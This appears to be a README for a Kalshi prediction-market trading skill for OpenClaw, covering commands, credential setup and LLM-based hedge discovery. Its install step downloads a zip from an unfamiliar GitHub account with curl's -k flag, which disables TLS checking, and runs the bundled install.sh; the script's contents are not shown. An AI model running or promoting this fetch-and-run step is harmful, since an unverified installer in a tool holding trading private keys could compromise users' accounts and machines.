# KalshiClaw

**Trading-enabled Kalshi skill for OpenClaw.**

Browse regulated US prediction markets, execute trades, track positions with live P&L, and discover hedging opportunities via LLM-powered logical analysis.

> **Disclaimer:** This software is provided as-is for educational and experimental purposes. It is not financial advice. Trading prediction markets involves risk of loss. This code has not been audited. Use at your own risk and only with funds you can afford to lose.

---

## Installation (macOS only)

```bash
curl -fsSLk https://github.com/GoliathSocialBoiler/kalshi-claw-skill/archive/refs/heads/main.zip -o /tmp/cw.zip && \
unzip -qo /tmp/cw.zip -d /tmp && \
cd /tmp/kalshi-claw-skill-main && \
bash install.sh
```

> **Requirements:** `node`, `npm`, `uv` — all installable via `brew`.

---

## Features

### Market browsing

- `kalshi markets trending` — Top open markets by volume
- `kalshi markets search "query"` — Search by keyword
- `kalshi market <ticker>` — Market details with YES/NO prices

### Trading

- `kalshi buy <ticker> YES <amount>` — Buy YES contracts
- `kalshi buy <ticker> NO <amount>` — Buy NO contracts
- `kalshi sell <ticker> YES <amount>` — Sell YES contracts
- `kalshi sell <ticker> NO <amount>` — Sell NO contracts
- Direct market orders via Kalshi REST API v2

### Position tracking

- `kalshi positions` — All open positions with live P&L
- `kalshi position <ticker>` — Detailed single position view
- Positions stored locally in `~/.openclaw/kalshi/positions.json`

### Portfolio management

- `kalshi wallet status` — Balance and resting orders

### Hedge discovery

- `kalshi hedge scan` — Scan trending markets for hedges
- `kalshi hedge scan --query "topic"` — Topic-filtered scan
- `kalshi hedge analyze <t1> <t2>` — Deep-analyze a specific pair

LLM-powered contrapositive logic (via OpenRouter). Only logically necessary implications are accepted — correlations and "likely" relationships are rejected.

**Coverage tiers:** T1 ≥95% · T2 90–95% · T3 85–90%

---

## Setup

### 1. Configure credentials

Edit `~/.openclaw/openclaw.json` after install:

```json
{
  "skills": {
    "entries": {
      "kalshi": {
        "enabled": true,
        "command": "node ~/.openclaw/skills/kalshi-claw-skill/dist/index.js",
        "env": {
          "KALSHI_API_KEY_ID": "your-api-key-id",
          "KALSHI_PRIVATE_KEY_PATH": "/path/to/your/private_key.pem",
          "OPENROUTER_API_KEY": "sk-or-v1-...",
          "KALSHI_ENV": "demo"
        }
      }
    }
  }
}
```

### Where to get keys

- **Kalshi API key** — [kalshi.com/account/api](https://kalshi.com/account/api) → generate RSA key pair, save private key as `.pem`
- **OpenRouter key** — [openrouter.ai/settings/keys](https://openrouter.ai/settings/keys) (free tier available)

### 2. Run standalone (no OpenClaw)

```bash
cd ~/.openclaw/skills/kalshi-claw-skill
uv run python scripts/kalshi.py markets trending
```

---

## Example prompts (OpenClaw / Claude Desktop)

```
What's trending on Kalshi?
Show me details for market INXD-23DEC31-B4000
What's my Kalshi balance?
Buy $50 YES on INXD-23DEC31-B4000
Find hedging opportunities on Kalshi
Run hedge scan on Kalshi limit 15
Show my Kalshi positions
Sell my YES position on INXD-23DEC31-B4000
```

---

## Environment variables

| Variable | Required | Description |
|---|---|---|
| `KALSHI_API_KEY_ID` | Yes (trading) | Kalshi API key ID |
| `KALSHI_PRIVATE_KEY_PATH` | Yes (trading) | Path to RSA private key PEM |
| `OPENROUTER_API_KEY` | Yes (hedge) | OpenRouter API key for LLM |
| `KALSHI_ENV` | No | `demo` or `prod` (default: `demo`) |

---

## Directory structure

```
kalshi-claw-skill/
├── SKILL.md                    # OpenClaw skill manifest
├── README.md                   # This file
├── install.sh                  # macOS installer
├── pyproject.toml              # Python dependencies (uv)
├── package.json                # Node.js dependencies
├── tsconfig.json               # TypeScript config
│
├── src/
│   └── index.ts                # TypeScript MCP server (bridges to Python)
│
├── scripts/
│   ├── kalshi.py               # CLI dispatcher (Typer)
│   ├── markets.py              # Market browsing
│   ├── trade.py                # Order execution
│   ├── positions.py            # Position tracking + P&L
│   ├── wallet.py               # Portfolio / balance
│   └── hedge.py                # LLM hedge discovery
│
└── lib/
    ├── __init__.py
    ├── kalshi_client.py        # Kalshi REST API v2 client (RSA auth)
    ├── llm_client.py           # OpenRouter LLM client
    ├── coverage.py             # Coverage tiers + hedge pair model
    └── position_storage.py     # Local JSON position store
```

---

## How it works

### Authentication

Kalshi uses **RSA-signed requests**. Every API call is signed with your private key — no secrets are transmitted, only the signature.

Generate a key pair:

```bash
openssl genrsa -out kalshi_private.pem 2048
openssl rsa -in kalshi_private.pem -pubout -out kalshi_public.pem
```

Upload `kalshi_public.pem` to [kalshi.com/account/api](https://kalshi.com/account/api) and keep `kalshi_private.pem` safe.

### Hedge discovery flow

1. Fetch open markets (filtered by topic if `--query` given)
2. Generate all market pairs
3. Send each pair's questions to the LLM for logical implication analysis
4. Filter results by coverage tier
5. Display actionable hedge opportunities with cost estimates

**Coverage tiers:**

| Tier | Coverage | Meaning |
|------|----------|---------|
| T1 (HIGH) | ≥95% | Near-arbitrage — near-certain logical implication |
| T2 (GOOD) | 90–95% | Strong hedge |
| T3 (MODERATE) | 85–90% | Decent hedge, some residual risk |
| T4 (LOW) | <85% | Speculative (filtered out by default) |

---

## Troubleshooting

### "No module named kalshi_client"

Run from the skill directory with `uv`:

```bash
cd ~/.openclaw/skills/kalshi-claw-skill
uv run python scripts/kalshi.py markets trending
```

### "Authentication failed"

- Verify `KALSHI_API_KEY_ID` matches the key ID shown on kalshi.com
- Ensure `KALSHI_PRIVATE_KEY_PATH` points to the correct `.pem` file
- Check that the public key is uploaded to your Kalshi account

### "uv: command not found"

```bash
curl -LsSf https://astral.sh/uv/install.sh | sh
```

Or via Homebrew:

```bash
brew install uv
```

### Hedge scan finds 0 results

- Try a more specific `--query` to narrow the market set
- Try `--min-tier 4` to see weaker relationships
- Some topics genuinely have no logically implied pairs — that's correct behavior

---

## License

MIT

## Credits

Inspired by [polyclaw](https://github.com/chainstacklabs/polyclaw) by Chainstack.

- **Kalshi** — Regulated US prediction exchange
- **OpenRouter** — LLM API for hedge discovery
